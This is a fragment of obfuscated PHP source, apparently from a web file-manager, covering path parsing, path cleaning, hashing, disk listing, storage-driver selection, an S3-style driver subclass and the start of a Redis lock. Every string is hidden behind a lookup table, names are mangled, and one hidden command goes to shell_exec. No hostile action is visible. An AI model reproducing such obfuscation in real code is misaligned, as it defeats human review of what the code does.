array_values(self::typeList()); preg_match($ ÕÒÎ¨ó[1407], $ãÇŸ˜£¡, $À®€çÊÑ); $Ê”µçÆ = array($ ÕÒÎ¨ó[519] => !1, $ ÕÒÎ¨ó[1408] => !1, $ ÕÒÎ¨ó[516] => !1, $ ÕÒÎ¨ó[87] => $ãÇŸ˜£¡, $ ÕÒÎ¨ó[1305] => !1, $ ÕÒÎ¨ó[1304] => $ ÕÒÎ¨ó[12]); if (is_array($À®€çÊÑ) && count($À®€çÊÑ) == 5) { $»…œ˜Ç = $ ÕÒÎ¨ó[1409] . $À®€çÊÑ[2] . $ ÕÒÎ¨ó[412]; if (in_array($»…œ˜Ç, $ãç¢¼)) { $Ê”µçÆ[$ ÕÒÎ¨ó[1305]] = $À®€çÊÑ[1]; $Ê”µçÆ[$ ÕÒÎ¨ó[33]] = $»…œ˜Ç; $Ê”µçÆ[$ ÕÒÎ¨ó[1410]] = substr($»…œ˜Ç, 1, -1); $Ê”µçÆ[$ ÕÒÎ¨ó[495]] = $À®€çÊÑ[3]; } $Ê”µçÆ[$ ÕÒÎ¨ó[1304]] = $À®€çÊÑ[4]; } if ($Ê”µçÆ[$ ÕÒÎ¨ó[519]] == self::KOD_SOURCE) { $Ê”µçÆ[$ ÕÒÎ¨ó[495]] = intval($Ê”µçÆ[$ ÕÒÎ¨ó[495]]); $Ê”µçÆ[$ ÕÒÎ¨ó[1308]] = $Ê”µçÆ[$ ÕÒÎ¨ó[495]]; } $¤±Ãáüô = array($ ÕÒÎ¨ó[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $Ê”µçÆ[$ ÕÒÎ¨ó[1372]] = in_array($Ê”µçÆ[$ ÕÒÎ¨ó[33]], $¤±Ãáüô); return $Ê”µçÆ; } public static function isTruePath($¹ÇÏÃ™Ù) { $âò¶Â²Ğ =& $_SERVER[‘ÆÜ‘œ]; if (substr($¹ÇÏÃ™Ù, 0, 1) != $âò¶Â²Ğ[1409]) { return !0; } if (strpos($¹ÇÏÃ™Ù, $âò¶Â²Ğ[506]) === 0) { return !0; } if (strpos($¹ÇÏÃ™Ù, $âò¶Â²Ğ[1376]) === 0) { return !0; } if (strpos($¹ÇÏÃ™Ù, $âò¶Â²Ğ[1411]) === 0) { return !0; } if (strpos($¹ÇÏÃ™Ù, $âò¶Â²Ğ[1412]) === 0) { return !0; } if (strpos($¹ÇÏÃ™Ù, $âò¶Â²Ğ[1413]) === 0) { return !0; } if (strpos($¹ÇÏÃ™Ù, $âò¶Â²Ğ[1414]) === 0) { return !0; } return !1; } public static function clear($ÓÎ­ì´Ã) { $…—²šš =& $_SERVER[‘ÆÜ‘œ]; $ÓÎ­ì´Ã = str_replace(array($…—²šš[1198], $…—²šš[286]), $…—²šš[53], $ÓÎ­ì´Ã); $ÓÎ­ì´Ã = str_replace($…—²šš[98], $…—²šš[8], $ÓÎ­ì´Ã); $‘¸ô½’ö = $…—²šš[1415]; if (substr($ÓÎ­ì´Ã, 0, 3) == $…—²šš[1416]) { $ÓÎ­ì´Ã = substr($ÓÎ­ì´Ã, 3); } while (strstr($ÓÎ­ì´Ã, $‘¸ô½’ö)) { $ÓÎ­ì´Ã = str_replace($‘¸ô½’ö, $…—²šš[8], $ÓÎ­ì´Ã); } $ÓÎ­ì´Ã = preg_replace($…—²šš[1417], $…—²šš[8], $ÓÎ­ì´Ã); if ($ÓÎ­ì´Ã == $…—²šš[8]) { return $…—²šš[8]; } $ÓÎ­ì´Ã = rtrim($ÓÎ­ì´Ã, $…—²šš[8]); return $ÓÎ­ì´Ã; } public static function pathTrue($ó«Å›™) { $íÖ¯—ô¼ =& $_SERVER[‘ÆÜ‘œ]; if (!$ó«Å›™) { return $íÖ¯—ô¼[12]; } $ó«Å›™ = str_replace($íÖ¯—ô¼[255], $íÖ¯—ô¼[8], str_replace($íÖ¯—ô¼[1418], $íÖ¯—ô¼[8], $ó«Å›™)); $ó«Å›™ = str_replace($íÖ¯—ô¼[255], $íÖ¯—ô¼[8], str_replace($íÖ¯—ô¼[1418], $íÖ¯—ô¼[8], $ó«Å›™)); if (!strstr($ó«Å›™, $íÖ¯—ô¼[1416])) { return $ó«Å›™; } $İÖõñÊÚ = explode($íÖ¯—ô¼[8], $ó«Å›™); foreach ($İÖõñÊÚ as $¨ßÊ‡›¬ => $Ê¡ñá†ê) { if ($Ê¡ñá†ê !== $íÖ¯—ô¼[1419]) { continue; } for ($¾ êÃˆù = $¨ßÊ‡›¬; $¾ êÃˆù >= 0; $¾ êÃˆù--) { if ($İÖõñÊÚ[$¾ êÃˆù] === $íÖ¯—ô¼[10] || $İÖõñÊÚ[$¾ êÃˆù] === $íÖ¯—ô¼[1419] || $İÖõñÊÚ[$¾ êÃˆù] === -1) { continue; } if ($İÖõñÊÚ[$¾ êÃˆù] === $íÖ¯—ô¼[12]) { $İÖõñÊÚ[$¨ßÊ‡›¬] = -1; break; } $İÖõñÊÚ[$¨ßÊ‡›¬] = -1; $İÖõñÊÚ[$¾ êÃˆù] = -1; break; } } $Í£è·ú = array(); foreach ($İÖõñÊÚ as $Ê¡ñá†ê) { if ($Ê¡ñá†ê !== -1) { $Í£è·ú[] = $Ê¡ñá†ê; } } $ú½úåÅ = implode($íÖ¯—ô¼[8], $Í£è·ú); if (strpos($ú½úåÅ, $íÖ¯—ô¼[1420]) === 0) { $ú½úåÅ = $íÖ¯—ô¼[1416] . substr($ú½úåÅ, strlen($íÖ¯—ô¼[1420])); } return $ú½úåÅ; } public static function pathUrlClear($öû“½…²) { $˜×îŸ¿ª =& $_SERVER[‘ÆÜ‘œ]; if (!$öû“½…²) { return $öû“½…²; } $öû“½…² = rawurldecode($öû“½…²); $öû“½…² = str_replace($˜×îŸ¿ª[1418], $˜×îŸ¿ª[8], $öû“½…²); if (strpos($öû“½…², $˜×îŸ¿ª[76]) > 0) { $öû“½…² = substr($öû“½…², 0, strpos($öû“½…², $˜×îŸ¿ª[76])); } if (strpos($öû“½…², $˜×îŸ¿ª[1421]) > 0) { $öû“½…² = substr($öû“½…², 0, strpos($öû“½…², $˜×îŸ¿ª[1421])); } return $öû“½…²; } public static function sourceID($ÂÎ °¡Ë) { $Ã¦‚ªÙœ =& $_SERVER[‘ÆÜ‘œ]; $ û‚™†ñ = self::parse($ÂÎ °¡Ë); if ($ û‚™†ñ[$Ã¦‚ªÙœ[33]] !== self::KOD_SOURCE) { show_json(LNG($Ã¦‚ªÙœ[1422]), !1); } return $ û‚™†ñ[$Ã¦‚ªÙœ[495]]; } public static function make($ÏóŒ¬ı) { if (!$ÏóŒ¬ı) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÏóŒ¬ı)); } public static function makeShare($Ûìú‹º›, $ÎìÁÍê) { return self::makePath(self::KOD_SHARE_ITEM, $Ûìú‹º›, $ÎìÁÍê); } public static function makeFileTypePath($ˆï‰îÍ¦) { return self::makePath(self::KOD_USER_FILE_TYPE, $ˆï‰îÍ¦); } public static function makeFileTagPath($¨í“úÂü) { return self::makePath(self::KOD_USER_FILE_TAG, $¨í“úÂü); } public static function makePath($Éè×ç³¶, $ÒÕ™ñ´ = '', $¢éÆ·é¤ = '') { $Ä—±Íëğ =& $_SERVER[‘ÆÜ‘œ]; $ïÁ ¾•– = substr($Éè×ç³¶, 1, -1); $çªµùº = $Ä—±Íëğ[1423] . $ïÁ ¾•– . $Ä—±Íëğ[1424] . $ÒÕ™ñ´ . $Ä—±Íëğ[1425]; $çªµùº = $¢éÆ·é¤ ? $çªµùº . $¢éÆ·é¤ . $Ä—±Íëğ[8] : $çªµùº; return $çªµùº; } public static function hashPath($Ğ¹ŒÙ, $Î‰³å²· = false) { $™Šª°ª‹ =& $_SERVER[‘ÆÜ‘œ]; if (!$Ğ¹ŒÙ) { return $™Šª°ª‹[12]; } $úæ¶­³ = is_array($Ğ¹ŒÙ) ? $Ğ¹ŒÙ : IO::info($Ğ¹ŒÙ); $ªìç’Ûı = _get($úæ¶­³, $™Šª°ª‹[1426], $™Šª°ª‹[12]); if (!$ªìç’Ûı && isset($úæ¶­³[$™Šª°ª‹[565]])) { $ªìç’Ûı = $úæ¶­³[$™Šª°ª‹[565]]; } if (!$ªìç’Ûı && isset($úæ¶­³[$™Šª°ª‹[236]])) { $ªìç’Ûı = trim($úæ¶­³[$™Šª°ª‹[236]], $™Šª°ª‹[119]); } if ($ªìç’Ûı) { return $ªìç’Ûı; } if (!$ªìç’Ûı && isset($úæ¶­³[$™Šª°ª‹[192]]) && $úæ¶­³[$™Šª°ª‹[192]]) { $úæ¶­³ = IO::info(KodIO::make($úæ¶­³[$™Šª°ª‹[192]])); $ªìç’Ûı = _get($úæ¶­³, $™Šª°ª‹[1426], $™Šª°ª‹[12]); if (!$ªìç’Ûı && isset($úæ¶­³[$™Šª°ª‹[565]])) { $ªìç’Ûı = $úæ¶­³[$™Šª°ª‹[565]]; } } $ŒŸúĞ©Ñ = md5($úæ¶­³[$™Šª°ª‹[87]] . $úæ¶­³[$™Šª°ª‹[79]] . $úæ¶­³[$™Šª°ª‹[88]]); $œâÉ½öÈ = $ŒŸúĞ©Ñ . $™Šª°ª‹[1427]; $ªìç’Ûı = $ªìç’Ûı ? $ªìç’Ûı : Cache::get($œâÉ½öÈ); if (!$ªìç’Ûı && $Î‰³å²·) { $ªìç’Ûı = IO::hashSimple($úæ¶­³[$™Šª°ª‹[87]]); Cache::set($œâÉ½öÈ, $ªìç’Ûı ? $ªìç’Ûı : $ŒŸúĞ©Ñ, 3600 * 24 * 30); } return $ªìç’Ûı ? $ªìç’Ûı : $ŒŸúĞ©Ñ; } public static function hashPathSafe($¢­ÛÉ“ú, $…È‚Ì¬î = false) { $ÈöÉ› =& $_SERVER[‘ÆÜ‘œ]; $ô€‰¥Í– = self::hashPath($¢­ÛÉ“ú, $…È‚Ì¬î); return md5($ô€‰¥Í– . $ÈöÉ›[1428] . Model($ÈöÉ›[880])->get($ÈöÉ›[881])); } public static function initSystemPath() { $¿½¥ŠöŒ =& $_SERVER[‘ÆÜ‘œ]; if (defined($¿½¥ŠöŒ[1429])) { return; } define($¿½¥ŠöŒ[1429], self::systemPath($¿½¥ŠöŒ[190])); define($¿½¥ŠöŒ[1430], self::systemPath($¿½¥ŠöŒ[1431])); define($¿½¥ŠöŒ[1432], self::systemPath($¿½¥ŠöŒ[1433])); define($¿½¥ŠöŒ[1434], self::systemPath($¿½¥ŠöŒ[1435])); IOHistory::bindEvent(); } public static function systemPath($•§ß°á ) { $Ü­ç… ö =& $_SERVER[‘ÆÜ‘œ]; $À®ƒ¼äª = $Ü­ç… ö[1436] . ucfirst($•§ß°á ); $îâ¦óïù = Model($Ü­ç… ö[880])->get($À®ƒ¼äª); if ($îâ¦óïù) { return $îâ¦óïù; } if ($•§ß°á  == $Ü­ç… ö[190]) { $îâ¦óïù = self::make(Model($Ü­ç… ö[939])->systemRootPathAdd($Ü­ç… ö[636])); } else { $îâ¦óïù = self::systemPath($Ü­ç… ö[190]); $™ù˜¯Ğì = self::sourceID($îâ¦óïù); $îâ¦óïù = self::make(Model($Ü­ç… ö[939])->mkdir($™ù˜¯Ğì, $•§ß°á )); } Model($Ü­ç… ö[880])->set($À®ƒ¼äª, $îâ¦óïù); return $îâ¦óïù; } public static function systemFolder($÷‰ßšÔ“) { $æ—ßçêÈ = IO_PATH_SYSTEM_SOURCE . $÷‰ßšÔ“; $®±£ŞŒé = Cache::get($æ—ßçêÈ); if (!$®±£ŞŒé) { $ö‹¾¬ = IO::infoFullSimple($æ—ßçêÈ); if (!$ö‹¾¬) { $®±£ŞŒé = IO::mkdir($æ—ßçêÈ, REPEAT_SKIP); } else { $®±£ŞŒé = $ö‹¾¬[$_SERVER[‘ÆÜ‘œ][87]]; } Cache::set($æ—ßçêÈ, $®±£ŞŒé, 3600 * 10); } return $®±£ŞŒé; } public static function defaultDriver() { return Model($_SERVER[‘ÆÜ‘œ][875])->defaultDriver(); } public static function defaultDriverInit() { $‹ƒŒ–• =& $_SERVER[‘ÆÜ‘œ]; static $äàÎÏ®¡ = false; if ($äàÎÏ®¡) { return $äàÎÏ®¡; } $ğíıàÑ = self::defaultDriver(); $äàÎÏ®¡ = IO::init($‹ƒŒ–•[1437] . $ğíıàÑ[$‹ƒŒ–•[495]] . $‹ƒŒ–•[1425]); return $äàÎÏ®¡; } public static function fileTypeList() { $¸²¾¹ëË =& $_SERVER[‘ÆÜ‘œ]; $°£¡‚ş¸ = $GLOBALS[$¸²¾¹ëË[6]][$¸²¾¹ëË[1438]]; foreach ($°£¡‚ş¸ as $ÁâáÀ´ğ => $Ì¶ŸÏ½¢) { $²Â¶‹¹¨ = $¸²¾¹ëË[1439] . $ÁâáÀ´ğ; $êòºÁÇ” = LNG($²Â¶‹¹¨); if ($²Â¶‹¹¨ != $êòºÁÇ”) { $°£¡‚ş¸[$ÁâáÀ´ğ][$¸²¾¹ëË[32]] = $êòºÁÇ”; } } return $°£¡‚ş¸; } public static function ioFileDriverGet($ˆòÇö¹ = '') { $ˆ‹Î¿½¾ =& $_SERVER[‘ÆÜ‘œ]; static $ñĞªûÎ = array(); static $Ç›ÅÛ¼Š = array(); static $“ƒÍ™Éï = array(); static $°÷î«Ú = false; if ($°÷î«Ú === !1) { $°÷î«Ú = array($ˆ‹Î¿½¾[606] => array(), $ˆ‹Î¿½¾[692] => array()); $¶ÚšËØø = Model($ˆ‹Î¿½¾[1440])->get(!1, $ˆ‹Î¿½¾[1441]); foreach ($¶ÚšËØø as $áïÃ¯ª’ => $ŞËšºƒ) { if (!$ŞËšºƒ || $ŞËšºƒ == $ˆ‹Î¿½¾[12]) { continue; } if (strstr($áïÃ¯ª’, $ˆ‹Î¿½¾[1442])) { $²Ô§ åï = str_replace($ˆ‹Î¿½¾[1442], $ˆ‹Î¿½¾[12], $áïÃ¯ª’); $°÷î«Ú[$ˆ‹Î¿½¾[606]][$²Ô§ åï] = $ŞËšºƒ; } else { if (strstr($áïÃ¯ª’, $ˆ‹Î¿½¾[1443])) { $²Ô§ åï = str_replace($ˆ‹Î¿½¾[1443], $ˆ‹Î¿½¾[12], $áïÃ¯ª’); $°÷î«Ú[$ˆ‹Î¿½¾[692]][$²Ô§ åï] = $ŞËšºƒ; } } } } $ÛˆÚÊŞ = self::defaultDriver(); if (!$ˆòÇö¹ || !$°÷î«Ú[$ˆ‹Î¿½¾[606]] && !$°÷î«Ú[$ˆ‹Î¿½¾[692]]) { return $ÛˆÚÊŞ; } $‰Ï®£ÜŸ = self::getPathSourceID($ˆòÇö¹); if (!$‰Ï®£ÜŸ) { return $ÛˆÚÊŞ; } if (isset($ñĞªûÎ[$‰Ï®£ÜŸ])) { return $ñĞªûÎ[$‰Ï®£ÜŸ]; } $Îù‰á§ = Model($ˆ‹Î¿½¾[939])->sourceInfo($‰Ï®£ÜŸ); $ôÕíŠİ£ = $Îù‰á§[$ˆ‹Î¿½¾[597]]; $ö‹»ŞîÉ = array(); if (!$Îù‰á§) { return $ÛˆÚÊŞ; } if ($Îù‰á§[$ˆ‹Î¿½¾[189]] == $ˆ‹Î¿½¾[91]) { if (isset($“ƒÍ™Éï[$ôÕíŠİ£])) { return $“ƒÍ™Éï[$ôÕíŠİ£]; } if (isset($°÷î«Ú[$ˆ‹Î¿½¾[692]][$ôÕíŠİ£])) { $‡àä–¯ª = Model($ˆ‹Î¿½¾[875])->driverInfo($°÷î«Ú[$ˆ‹Î¿½¾[692]][$ôÕíŠİ£]); $ÛˆÚÊŞ = $‡àä–¯ª ? $‡àä–¯ª : $ÛˆÚÊŞ; $“ƒÍ™Éï[$ôÕíŠİ£] = $ÛˆÚÊŞ; $ñĞªûÎ[$‰Ï®£ÜŸ] = $ÛˆÚÊŞ; return $ÛˆÚÊŞ; } $ö‹»ŞîÉ = self::groupParentUser($ôÕíŠİ£); } else { if ($Îù‰á§[$ˆ‹Î¿½¾[189]] == $ˆ‹Î¿½¾[532]) { $åÒŒ¯Öƒ = Model($ˆ‹Î¿½¾[1444])->getInfo($ôÕíŠİ£); if ($åÒŒ¯Öƒ) { $ö‹»ŞîÉ = explode($ˆ‹Î¿½¾[50], trim($åÒŒ¯Öƒ[$ˆ‹Î¿½¾[612]], $ˆ‹Î¿½¾[50])); $ö‹»ŞîÉ = array_remove_value($ö‹»ŞîÉ, $ˆ‹Î¿½¾[229]); $ö‹»ŞîÉ[] = $ôÕíŠİ£; $ö‹»ŞîÉ = array_reverse($ö‹»ŞîÉ); } } } foreach ($ö‹»ŞîÉ as $¼öïÄ»Í) { if (!isset($°÷î«Ú[$ˆ‹Î¿½¾[606]][$¼öïÄ»Í])) { continue; } if (isset($Ç›ÅÛ¼Š[$¼öïÄ»Í])) { return $Ç›ÅÛ¼Š[$¼öïÄ»Í]; } $‡àä–¯ª = Model($ˆ‹Î¿½¾[875])->driverInfo($°÷î«Ú[$ˆ‹Î¿½¾[606]][$¼öïÄ»Í]); $ÛˆÚÊŞ = $‡àä–¯ª ? $‡àä–¯ª : $ÛˆÚÊŞ; $Ç›ÅÛ¼Š[$¼öïÄ»Í] = $ÛˆÚÊŞ; break; } if ($Îù‰á§[$ˆ‹Î¿½¾[189]] == $ˆ‹Î¿½¾[91]) { $“ƒÍ™Éï[$ôÕíŠİ£] = $ÛˆÚÊŞ; } $ñĞªûÎ[$‰Ï®£ÜŸ] = $ÛˆÚÊŞ; return $ÛˆÚÊŞ; } private static function getPathSourceID($ã™õü‘ü) { $£¿¡ª•Æ =& $_SERVER[‘ÆÜ‘œ]; static $Ó›Ä—ıÇ = array(); if (!$ã™õü‘ü) { return $£¿¡ª•Æ[12]; } $éªÄâŸ  = substr($ã™õü‘ü, 0, strlen($£¿¡ª•Æ[506])) == $£¿¡ª•Æ[506]; $–îıÁ°Ñ = substr($ã™õü‘ü, 0, strlen($£¿¡ª•Æ[1411])) == $£¿¡ª•Æ[1411]; $ü´ §‚Ê = substr($ã™õü‘ü, 0, strlen($£¿¡ª•Æ[1412])) == $£¿¡ª•Æ[1412]; if (!$éªÄâŸ  && !$–îıÁ°Ñ && !$ü´ §‚Ê) { return $£¿¡ª•Æ[12]; } $ûÂ‰¡¤Ğ = self::parse($ã™õü‘ü); $Û÷Ø¿ï¹ = $ûÂ‰¡¤Ğ[$£¿¡ª•Æ[1305]]; if ($éªÄâŸ ) { return $ûÂ‰¡¤Ğ[$£¿¡ª•Æ[495]]; } if (isset($Ó›Ä—ıÇ[$Û÷Ø¿ï¹])) { $ëÊºï¢Í = $Ó›Ä—ıÇ[$Û÷Ø¿ï¹]; } else { $ëÊºï¢Í = IO::init($Û÷Ø¿ï¹); $Ó›Ä—ıÇ[$Û÷Ø¿ï¹] = $ëÊºï¢Í; } if (isset($ëÊºï¢Í->pathParse[$£¿¡ª•Æ[1308]])) { return $ëÊºï¢Í->pathParse[$£¿¡ª•Æ[1308]]; } return $£¿¡ª•Æ[12]; } private static function groupParentUser($²ØõÙõî) { $®ÀóÅÙÏ =& $_SERVER[‘ÆÜ‘œ]; $·ñú ™¼ = Model($®ÀóÅÙÏ[625])->getInfo($²ØõÙõî); if (!$·ñú ™¼) { return array(); } $¦ä°ß¬ = array_to_keyvalue($·ñú ™¼[$®ÀóÅÙÏ[1445]], $®ÀóÅÙÏ[12], $®ÀóÅÙÏ[1446]); $ÄöŸ‚ö = array(); foreach ($·ñú ™¼[$®ÀóÅÙÏ[1445]] as $‹ïöı¶²) { $ÄöŸ‚ö[] = $‹ïöı¶²[$®ÀóÅÙÏ[1446]]; $…Šâ“İÚ = explode($®ÀóÅÙÏ[50], trim($‹ïöı¶²[$®ÀóÅÙÏ[612]], $®ÀóÅÙÏ[50])); $…Šâ“İÚ = array_remove_value($…Šâ“İÚ, $®ÀóÅÙÏ[229]); $…Šâ“İÚ = array_reverse($…Šâ“İÚ); $ÄöŸ‚ö = array_merge($ÄöŸ‚ö, $…Šâ“İÚ); } return array_unique($ÄöŸ‚ö); } public static function diskList($€§³èçÁ = true) { $å¸Ôü¶ò = $_SERVER[‘ÆÜ‘œ][1447]; if ($€§³èçÁ) { $ªµÖä³ = Cache::get($å¸Ôü¶ò); if (is_array($ªµÖä³)) { return $ªµÖä³; } } $ªµÖä³ = self::diskListGet(); Cache::set($å¸Ôü¶ò, $ªµÖä³, 60); return $ªµÖä³; } public static function diskListGet() { $·È©×Œ¡ =& $_SERVER[‘ÆÜ‘œ]; $…ÓÙ’ŸÁ = array(); if ($GLOBALS[$·È©×Œ¡[6]][$·È©×Œ¡[1448]] == $·È©×Œ¡[1449]) { $û¢ĞŒñ = $·È©×Œ¡[1450]; for ($îÌØûğû = 0; $îÌØûğû < strlen($û¢ĞŒñ); $îÌØûğû++) { $ÖäºÃö = $û¢ĞŒñ[$îÌØûğû] . $·È©×Œ¡[1451]; if (file_exists($ÖäºÃö)) { $…ÓÙ’ŸÁ[] = $ÖäºÃö; } } return $…ÓÙ’ŸÁ; } if (!function_exists($·È©×Œ¡[99])) { $…ÓÙ’ŸÁ[] = $·È©×Œ¡[953]; return $…ÓÙ’ŸÁ; } $«üâš˜Ë = explode($·È©×Œ¡[286], shell_exec($·È©×Œ¡[1452])); array_shift($«üâš˜Ë); array_pop($«üâš˜Ë); $‰´¹£úÅ = array($·È©×Œ¡[1453], $·È©×Œ¡[1454], $·È©×Œ¡[1455], $·È©×Œ¡[1456], $·È©×Œ¡[1457], $·È©×Œ¡[1458], $·È©×Œ¡[1459], $·È©×Œ¡[1460]); foreach ($«üâš˜Ë as $ä´¥Ù¡‘) { $¯¼’“Ô÷ = preg_split($·È©×Œ¡[1461], $ä´¥Ù¡‘); $ÖäºÃö = $¯¼’“Ô÷[count($¯¼’“Ô÷) - 1]; if (!strstr($¯¼’“Ô÷[0], $·È©×Œ¡[1462]) || !$ÖäºÃö) { continue; } $Ñôİûäó = rtrim($ÖäºÃö, $·È©×Œ¡[8]) . $·È©×Œ¡[8]; $…ÓÙ’ŸÁ[] = $Ñôİûäó; } return $…ÓÙ’ŸÁ; } public static function isSameDisk($øç¬­Ä, $…ÏæØÕç) { $ûÚª™½× =& $_SERVER[‘ÆÜ‘œ]; if ($GLOBALS[$ûÚª™½×[6]][$ûÚª™½×[1448]] == $ûÚª™½×[1449]) { return strtolower(substr($øç¬­Ä, 0, 1)) == strtolower(substr($…ÏæØÕç, 0, 1)); } $âïÍî£÷ = stat($øç¬­Ä); $öø¦¸ÚŸ = stat($…ÏæØÕç); if ($âïÍî£÷ === !1 || $öø¦¸ÚŸ === !1) { return !1; } return $âïÍî£÷[$ûÚª™½×[1463]] === $öø¦¸ÚŸ[$ûÚª™½×[1463]]; $éúµÍ€¨ = self::diskList(); $Ã£ß’Ó = !1; $¹Ûš›Å¢ = !1; sort($éúµÍ€¨); $éúµÍ€¨ = array_reverse($éúµÍ€¨); $øç¬­Ä = rtrim($øç¬­Ä, $ûÚª™½×[8]) . $ûÚª™½×[8]; $…ÏæØÕç = rtrim($…ÏæØÕç, $ûÚª™½×[8]) . $ûÚª™½×[8]; foreach ($éúµÍ€¨ as $Ä™ê†Ş–) { $ —˜“ìÍ = strlen($Ä™ê†Ş–); if (!$Ã£ß’Ó && substr($øç¬­Ä, 0, $ —˜“ìÍ) == $Ä™ê†Ş–) { $Ã£ß’Ó = $Ä™ê†Ş–; } if (!$¹Ûš›Å¢ && substr($…ÏæØÕç, 0, $ —˜“ìÍ) == $Ä™ê†Ş–) { $¹Ûš›Å¢ = $Ä™ê†Ş–; } if ($Ã£ß’Ó && $¹Ûš›Å¢) { break; } } return $Ã£ß’Ó === $¹Ûš›Å¢; } public static function transferType($Ãûú³ò©, $É‚å× ß) { $ ‡¾´ =& $_SERVER[‘ÆÜ‘œ]; $úÙ“Ü¦‹ = self::driverType($Ãûú³ò©); $¿«çò ‘ = self::driverType($É‚å× ß); if ($úÙ“Ü¦‹[$ ‡¾´[33]] == $¿«çò ‘[$ ‡¾´[33]] && $úÙ“Ü¦‹[$ ‡¾´[1464]] == $¿«çò ‘[$ ‡¾´[1464]]) { return $ ‡¾´[1465]; } if ($úÙ“Ü¦‹[$ ‡¾´[33]] == $ ‡¾´[987] && $¿«çò ‘[$ ‡¾´[33]] == $ ‡¾´[107]) { return $ ‡¾´[1333]; } if ($úÙ“Ü¦‹[$ ‡¾´[33]] == $ ‡¾´[107] && $¿«çò ‘[$ ‡¾´[33]] == $ ‡¾´[987]) { return $ ‡¾´[108]; } return $ ‡¾´[1466]; } public static function driverType($±¬¤¢›) { $ğóª­É =& $_SERVER[‘ÆÜ‘œ]; $”ıÔÉªœ = str_replace($ğóª­É[1467], $ğóª­É[12], strtolower($±¬¤¢›->getType())); if ($”ıÔÉªœ == $ğóª­É[865] || $”ıÔÉªœ == $ğóª­É[1468] || $”ıÔÉªœ == $ğóª­É[1469]) { $‡¦§íŒì = self::ioFileDriverGet($ğóª­É[506] . $±¬¤¢›->pathParse[$ğóª­É[1308]] . $ğóª­É[412]); $±¬¤¢› = IO::init($ğóª­É[1437] . $‡¦§íŒì[$ğóª­É[495]] . $ğóª­É[1425]); } else { if ($”ıÔÉªœ == $ğóª­É[1343] || $”ıÔÉªœ == $ğóª­É[1470]) { $±¬¤¢› = IO::init($±¬¤¢›->pathParse[$ğóª­É[1285]]); } } $˜Ó‚Ù­ø = $±¬¤¢›->path; $”ıÔÉªœ = str_replace($ğóª­É[1467], $ğóª­É[12], strtolower($±¬¤¢›->getType())); if ($”ıÔÉªœ == $ğóª­É[107]) { return array($ğóª­É[33] => $ğóª­É[107], $ğóª­É[1464] => $ğóª­É[12], $ğóª­É[87] => $˜Ó‚Ù­ø, $ğóª­É[96] => $±¬¤¢›); } return array($ğóª­É[33] => $ğóª­É[987], $ğóª­É[1464] => $±¬¤¢›->pathDriver, $ğóª­É[87] => $˜Ó‚Ù­ø, $ğóª­É[96] => $±¬¤¢›); } public static function pathDriverType($Ü ì‰İƒ) { return $Ü ì‰İƒ ? self::driverType(IO::init($Ü ì‰İƒ)) : !1; } public static function pathDriverLocal($şÄ—Ş¿) { $ı‚îºêÚ =& $_SERVER[‘ÆÜ‘œ]; $Á¹¶ÛÔÑ = $şÄ—Ş¿ ? self::driverType(IO::init($şÄ—Ş¿)) : !1; return strtolower($Á¹¶ÛÔÑ[$ı‚îºêÚ[33]]) == $ı‚îºêÚ[107] ? !0 : !1; } public static function allowCover($ğ†şÚ, $ş“ä‚†¶ = true) { $º½Ã“ˆ =& $_SERVER[‘ÆÜ‘œ]; if (is_string($ğ†şÚ)) { $ğ†şÚ = IO::info($ğ†şÚ); } if (!$ğ†şÚ || $ğ†şÚ[$º½Ã“ˆ[33]] == $º½Ã“ˆ[78] || $ğ†şÚ[$º½Ã“ˆ[79]] <= 100) { return !1; } if (isset($ğ†şÚ[$º½Ã“ˆ[1471]]) || !$ğ†şÚ[$º½Ã“ˆ[87]]) { return !1; } if (isset($ğ†şÚ[$º½Ã“ˆ[233]]) && !$ğ†şÚ[$º½Ã“ˆ[233]]) { return !1; } static $¦ÈÀÈş„ = false; if (!$¦ÈÀÈş„ || !$ş“ä‚†¶) { $®³Ùë•å = self::driverType(IO::init($ğ†şÚ[$º½Ã“ˆ[87]])); $”¯ˆøÏß = $®³Ùë•å[$º½Ã“ˆ[96]]; $¦ÈÀÈş„ = $º½Ã“ˆ[195]; if ($®³Ùë•å[$º½Ã“ˆ[33]] == $º½Ã“ˆ[107]) { $¦ÈÀÈş„ = $º½Ã“ˆ[1472]; } if ($®³Ùë•å[$º½Ã“ˆ[96]] && is_array($®³Ùë•å[$º½Ã“ˆ[96]]->config)) { $ı’Æ„Ôò = $®³Ùë•å[$º½Ã“ˆ[96]]->config; if (isset($ı’Æ„Ôò[$º½Ã“ˆ[1473]]) && $ı’Æ„Ôò[$º½Ã“ˆ[1473]]) { $¦ÈÀÈş„ = $º½Ã“ˆ[1472]; } } $»Ğ‘ª¶ı = KodIO::defaultDriver(); if (strtolower($»Ğ‘ª¶ı[$º½Ã“ˆ[96]]) == $º½Ã“ˆ[107] && is_array($»Ğ‘ª¶ı[$º½Ã“ˆ[6]])) { $¿ü‹¹©± = $»Ğ‘ª¶ı[$º½Ã“ˆ[6]][$º½Ã“ˆ[1317]]; if (substr($¿ü‹¹©±, 0, 2) == $º½Ã“ˆ[1474]) { $¿ü‹¹©± = str_replace($º½Ã“ˆ[1474], BASIC_PATH, $¿ü‹¹©±); } $¿ü‹¹©± = str_replace($º½Ã“ˆ[255], $º½Ã“ˆ[8], $¿ü‹¹©±); if (substr($ğ†şÚ[$º½Ã“ˆ[87]], 0, strlen($¿ü‹¹©±)) == $¿ü‹¹©±) { $¦ÈÀÈş„ = $º½Ã“ˆ[195]; } } } return $¦ÈÀÈş„ == $º½Ã“ˆ[1472] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($¨Ä ûï) { parent::__construct($¨Ä ûï); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto bÔ³°‘íäÅ; Bù„¾Ø®Ü: class CacheLockRedis { public function lock($±Ò¢¬¥í, $¸¯Í² = 10) { $ ¹È°• = Cache::init(); $½Ü†şóñ = microtime(!0) + $¸¯Í²; while (microtime(!0) < $½Ü†şóñ) { $‰ªÔâ“‹ = $ ¹È°•->get($±Ò¢¬¥í); if (!$‰ªÔâ“‹) { $³‡ôÕ½ = $ ¹È°•->setLock($±Ò¢¬¥í, $½Ü†şóñ, $¸¯Í²); if ($³‡ôÕ½) { return !0; } } else { if ($‰ªÔâ“‹ < microtime(!0)) { $ ¹È°•->set($±Ò¢¬¥í, $½Ü†şóñ, $¸¯Í² * 2); if ($ ¹È°•->get($±Ò¢¬¥í) === 